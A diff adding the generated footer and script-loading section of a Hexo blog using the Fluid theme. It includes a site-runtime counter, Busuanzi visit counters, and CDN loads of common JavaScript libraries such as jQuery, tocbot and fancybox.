+          if(hours<10) hours="0"+hours;
+          if(minutes<10) minutes="0"+minutes;
+          if(seconds<10) seconds="0"+seconds;
+
+          document.getElementById("timeDate").innerHTML = days + " 天";
+          document.getElementById("times").innerHTML = hours + " 时 " + minutes + " 分 " + seconds + " 秒";
+      }
+      setInterval(createtime, 1000);
+      createtime();
+    </script>
+  </div>
+
+  <!-- 自定义内容 -->
+  
+    <div style="margin-bottom:10px; font-size:13px; color:#666;">
+      ❤️  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+
+
+  <!-- PV/UV 统计（Busuanzi） -->
+  
+    <div style="margin-bottom:12px; font-size:14px; color:#3b82f6;">
+      👁‍🗨 总访问量：<span id="busuanzi_value_page_pv">载入中...</span>  
+      🧑 总访客数：<span id="busuanzi_value_site_uv">载入中...</span>
+    </div>
+    <script src="https://cdn.tutorialjinni.com/busuanzi/2.3.0/bsz.pure.mini.js"></script>
+  
+
+
+</div>
+
+<script src="/js/summon-plane.js"></script>
+
+
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
